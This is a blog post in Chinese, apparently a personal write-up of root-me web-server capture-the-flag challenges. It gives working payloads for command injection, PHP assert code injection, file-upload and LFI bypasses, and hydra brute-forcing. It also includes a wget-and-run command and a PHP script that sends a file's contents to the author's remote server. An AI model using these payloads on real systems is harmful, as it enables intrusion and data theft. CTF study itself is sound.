@@ -1,0 +1,2075 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="n3k0">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="n3k0">
+    <meta name="keywords" content="neko | n3k0">
+    <meta name="description" content="incisive expression">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>root-me WEB-Server · n3k0</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+        
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/alice.png" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >NEKO</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">root-me WEB-Server</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>NEKO</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(http://p0sa0ryfm.bkt.clouddn.com/18-5-14/46804335.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            root-me WEB-Server
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "root-me">root-me</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/03/30</span>
+                
+                
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>做题使我快乐</p>
+<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><p>查看源代码即可</p>
+<h1 id="HTTP-Open-redirect"><a href="#HTTP-Open-redirect" class="headerlink" title="HTTP - Open redirect"></a>HTTP - Open redirect</h1><p>redirect是跳转的意思，思路应该是抓包<br>随便打开一个链接后，用burp抓包<br>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /web-serveur/ch52/?url=https://slack.com&amp;h=e52dc719664ead63be3d5066c135b6da HTTP/1.1</span><br></pre></td></tr></table></figure></p>
+<p>注意到h是url的md5值,让url=<a href="https://www.baidu.com,h=f9751de431104b125f48dd79cc55822a" target="_blank" rel="noopener">https://www.baidu.com,h=f9751de431104b125f48dd79cc55822a</a><br>发包过去就有flag了.</p>
+<h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><p>命令注入<br>command1 &amp;&amp; command2   先执行command1后执行command2<br>command1 | command2     只执行command2<br>command1 &amp; command2    先执行command2后执行command1</p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|(cat index.php)</span><br><span class="line">然后查看源代码即可</span><br></pre></td></tr></table></figure></p>
+<h1 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h1><p>可以直接猜出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">password:admin</span><br></pre></td></tr></table></figure></p>
+<p>也可以用hydra<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L userList.txt -P passwordsList.txt challenge01.root-me.org  http-get /web-serveur/ch3/</span><br></pre></td></tr></table></figure></p>
+<h1 id="User-agent"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</h1><p><code>Wrong user-agent: you are not the &quot;admin&quot; browser!</code><br>用火狐的Modify Headers改下User-Agent头<br><img src="http://p0sa0ryfm.bkt.clouddn.com/18-3-30/35685118.jpg" alt=""><br>再刷新下就有了<br>或者用burp改</p>
+<h1 id="back-file"><a href="#back-file" class="headerlink" title="back file"></a>back file</h1><p>有备份文件index.php~</p>
+<h1 id="HTTP-directory-indexing"><a href="#HTTP-directory-indexing" class="headerlink" title="HTTP directory indexing"></a>HTTP directory indexing</h1><p>源码有个<code>&lt;!-- include(&quot;admin/pass.html&quot;) --&gt;</code><br>进入<a href="http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html</a><br>发现没什么东西<br>进入<a href="http://challenge01.root-me.org/web-serveur/ch4/admin" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch4/admin</a><br>发现是个目录，在admin.txt里找到flag</p>
+<h1 id="HTTP-Headers"><a href="#HTTP-Headers" class="headerlink" title="HTTP Headers"></a>HTTP Headers</h1><p>burp发包看回应发现返回包里有一个<code>Header-RootMe-Admin: none</code><br>发包的的时候在请求头里添加这一字段即可，有没有值都能拿到flag</p>
+<h1 id="HTTP-verb-tampering"><a href="#HTTP-verb-tampering" class="headerlink" title="HTTP verb tampering"></a>HTTP verb tampering</h1><p>常用HTTP请求：HEAD、GET、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT<br>只要不是GET,POST请求即可，用PUT，DELETE等请求方式都能绕过http授权认证，实际上随便写个不存在的请求方式就能绕过。此处是NEKO(要大写).</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NEKO /web-serveur/ch8/ HTTP/1.1</span><br><span class="line">Host: challenge01.root-me.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<h1 id="Install-files"><a href="#Install-files" class="headerlink" title="Install files"></a>Install files</h1><p>phpbb是世界通用的一个cms<br>题目提示install<br>进目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch6/phpbb/install</span><br></pre></td></tr></table></figure></p>
+<p>发现install.php<br>在install.php里可以找到密码:karambar</p>
+<h1 id="Improper-redirect"><a href="#Improper-redirect" class="headerlink" title="Improper redirect"></a>Improper redirect</h1><p>错误的重定向<br>用burp抓<code>http://challenge01.root-me.org/web-serveur/ch32/</code>的包，重放得到返回包，返回包里有flag。</p>
+<p>或者直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://challenge01.root-me.org/web-serveur/ch32/</span><br></pre></td></tr></table></figure></p>
+<h1 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h1><p>CRLF攻击:<br><a href="https://www.cnblogs.com/studyskill/p/6972576.html" target="_blank" rel="noopener">https://www.cnblogs.com/studyskill/p/6972576.html</a><br>这题主要是利用%0A换行来伪造日志。<br>正常情况是admin failed to authenticate.<br>通过提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin%20authenticated.%0aneko&amp;password=123</span><br></pre></td></tr></table></figure></p>
+<p>达到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin authenticated.</span><br><span class="line">neko failed to authenticate.</span><br></pre></td></tr></table></figure></p>
+<p>的效果，flag就拿到了。</p>
+<h1 id="File-upload-double-extensions"><a href="#File-upload-double-extensions" class="headerlink" title="File upload - double extensions"></a>File upload - double extensions</h1><p>apache解析漏洞<br>上传xxx.php.png即可<br>可以一句话也可以是大马<br>我用的大马<br><img src="http://p0sa0ryfm.bkt.clouddn.com/18-4-1/79521289.jpg" alt=""><br>注意是根目录下的.passwd，upload里也有个.passwd的文件夹但里面是没有东西的。</p>
+<h1 id="File-upload-MIME-type"><a href="#File-upload-MIME-type" class="headerlink" title="File upload - MIME type"></a>File upload - MIME type</h1><p>绕过类型比较<br>burp返回包里看到服务器是nginx<br>无法利用apache解析漏洞<br>这个题没检查文件后缀名，所以只要用burp改<code>Content-Type: image/png</code>即可上传，之后和上题一样。</p>
+<h1 id="HTTP-cookies"><a href="#HTTP-cookies" class="headerlink" title="HTTP cookies"></a>HTTP cookies</h1><p>点 <code>Saved email adresses</code><br>burp抓包<br>将cookie改为ch7=admin即可</p>
+<h1 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h1><p>目录遍历<br>galerie可以访问目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../</span><br></pre></td></tr></table></figure></p>
+<p>源码发现上层目录存在galerie和ch15.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../galerie/</span><br></pre></td></tr></table></figure></p>
+<p>源码发现galerie下的86hwnX2r目录<br>相同操作最后发现86hwnX2r目录下的password.txt</p>
+<h1 id="File-upload-null-byte"><a href="#File-upload-null-byte" class="headerlink" title="File upload - null byte"></a>File upload - null byte</h1><p>00截断，上传shell.php%00.png(这里%00不要用url解码，我也挺纳闷的),并改下type，服务端便只会解析shell.php，只要能访问shell.php就会给flag<br><img src="http://p0sa0ryfm.bkt.clouddn.com/18-4-2/73102417.jpg" alt=""><br><img src="http://p0sa0ryfm.bkt.clouddn.com/18-4-2/5278624.jpg" alt=""><br>访问<code>http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/qddq6jgg8s62lcqpkidann9r70/shell.php</code>即可</p>
+<h1 id="php-assert"><a href="#php-assert" class="headerlink" title="php assert()"></a>php assert()</h1><p>assert()可以执行php代码<br>发现page参数可控<br>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch47/?page=..</span><br></pre></td></tr></table></figure></p>
+<p>发现报错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: assert(): Assertion &quot;strpos(&apos;includes/...php&apos;, &apos;..&apos;) === false&quot; failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!</span><br></pre></td></tr></table></figure></p>
+<p>可以用代码注入来插入代码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch47/?page=&apos;,&apos;1&apos;) or system(&apos;ls -la&apos;) or strops(&apos;</span><br></pre></td></tr></table></figure></p>
+<p>闭合后代码为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(strpos(&apos;includes/&apos;,&apos;1&apos;) or system(&apos;ls -la&apos;) or strops(&apos;.php&apos;,&apos;..&apos;)===false)</span><br></pre></td></tr></table></figure></p>
+<p>然后system(‘cat .passwd’)即可</p>
+<h1 id="PHP-filters"><a href="#PHP-filters" class="headerlink" title="PHP filters"></a>PHP filters</h1><p>filter伪协议读源码<br>读login.php发现包含config.php<br>读config.php源码发现password<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure></p>
+<h1 id="PHP-register-globals"><a href="#PHP-register-globals" class="headerlink" title="PHP register globals"></a>PHP register globals</h1><p>变量覆盖<br>index.php.bak泄露源码<br>判断函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (( isset ($password) &amp;&amp; $password!=&quot;&quot; &amp;&amp; auth($password,$hidden_password)==1) || (is_array($_SESSION) &amp;&amp; $_SESSION[&quot;logged&quot;]==1 ) )&#123;</span><br><span class="line">    $aff=display(&quot;well done, you can validate with the password : $hidden_password&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $aff=display(&quot;try again&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>有两种方式通过验证：1.密码验证 2.session验证<br>关键代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (!ini_get(&apos;register_globals&apos;)) &#123;</span><br><span class="line">    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);</span><br><span class="line">    if (isset($_SESSION)) &#123;</span><br><span class="line">        array_unshift($superglobals, $_SESSION);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($superglobals as $superglobal) &#123;</span><br><span class="line">        extract($superglobal, 0 );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先上payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1</span><br></pre></td></tr></table></figure></p>
+<p>$superglobals中会有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">    [&quot;_SESSION&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [&quot;logged&quot;]=&gt;</span><br><span class="line">      string(1) &quot;1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>经extract()变量覆盖后，已定义的变量中就会有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&quot;_SESSION&quot;]=&gt;</span><br><span class="line"> &amp;array(1) &#123;</span><br><span class="line">   [&quot;logged&quot;]=&gt;</span><br><span class="line">   string(1) &quot;1&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>满足判断条件。<br>而<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_SESSION)) &#123;</span><br><span class="line">       array_unshift($superglobals, $_SESSION);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>的作用是向$superglobals添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;logged&quot;]=&gt;</span><br><span class="line">    string(1) &quot;1&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>经extract()变量覆盖后就有了$logged=1,对于本题而言，貌似没什么软用。</p>
+<h1 id="Command-injection-Filter-bypass"><a href="#Command-injection-Filter-bypass" class="headerlink" title="Command injection - Filter bypass"></a>Command injection - Filter bypass</h1><p>命令执行，由于只回显Ping OK 或者Syntax Error 和NOK<br>选择用dnslog(<a href="http://ceye.io/records/http" target="_blank" rel="noopener">http://ceye.io/records/http</a>)测试命令是否执行<br>经测试当post(直接在框里写的话会把%再url编码一次，建议用hackbar的post功能)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1 %0a curl http://ip.port.dmvara.ceye.io/`whoami`</span><br></pre></td></tr></table></figure></p>
+<p>时，会收到数据:<br><img src="http://p0sa0ryfm.bkt.clouddn.com/18-4-3/26333196.jpg" alt=""><br>然而并没有执行命令，没办法用dnslog来读源码(可能我操作有问题)。<br>于是换了个思路：<br>在vps上放上shell.txt:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$address = &apos;此处手动打码&apos;;</span><br><span class="line">$service_port = 2333;</span><br><span class="line"></span><br><span class="line">// 创建并返回一个套接字（通讯节点）</span><br><span class="line">$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">if ($socket === false) &#123;</span><br><span class="line">echo &quot;socket_create() failed, reason: &quot;.socket_strerror(socket_last_error()).&quot;\n&quot;;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">echo &quot;Attempting to connect to &apos;$address&apos; on port &apos;$service_port&apos;...&quot;;</span><br><span class="line">// 发起socket连接请求</span><br><span class="line">$result = socket_connect($socket, $address, $service_port);</span><br><span class="line">if($result === false) &#123;</span><br><span class="line">echo &quot;socket_connect() failed, reason: &quot;.socket_strerror(socket_last_error($socket)).&quot;\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;Connect success. \n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data=file_get_contents(&apos;index.php&apos;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 向socket服务器发送消息</span><br><span class="line">socket_write($socket, $data, strlen($data));</span><br><span class="line">echo  &quot;Client send success \n&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo PHP_EOL;</span><br><span class="line">socket_close($socket); // 关闭socket连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在vps上监听2333端口<br>然后post:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1 %0a wget http://手动打码/shell.txt -O /tmp/neko.php %0a php /tmp/neko.php</span><br></pre></td></tr></table></figure></p>
+<p>vps上就会收到index的源码:<br><img src="http://p0sa0ryfm.bkt.clouddn.com/18-4-3/30476955.jpg" alt=""><br>得到flag:Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!<br>尝试反弹shell，但一直瞬间断掉。</p>
+<h1 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h1><p>结合右侧guest/admin的选项，我们知道有一个admin目录。<br>通过url特点，可以猜出路径是由files和f两个参数拼接而成，(当文件不存在时)由报错可知是用的file_get_contents()函数。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch16/?files=&amp;f=../admin/index.php</span><br></pre></td></tr></table></figure></p>
+<h1 id="Local-File-Inclusion-Double-encoding"><a href="#Local-File-Inclusion-Double-encoding" class="headerlink" title="Local File Inclusion - Double encoding"></a>Local File Inclusion - Double encoding</h1><p>发现限制了<code>/</code><br>通过提交<code>/</code>的双重url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch45/index.php?page=contact%25%32%66</span><br></pre></td></tr></table></figure></p>
+<p>发现成功绕过,而且自动加上.inc.php的后缀名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(contact/.inc.php): failed to open stream: No such file or directory in /challenge/web-serveur/ch45/index.php on line 7</span><br></pre></td></tr></table></figure></p>
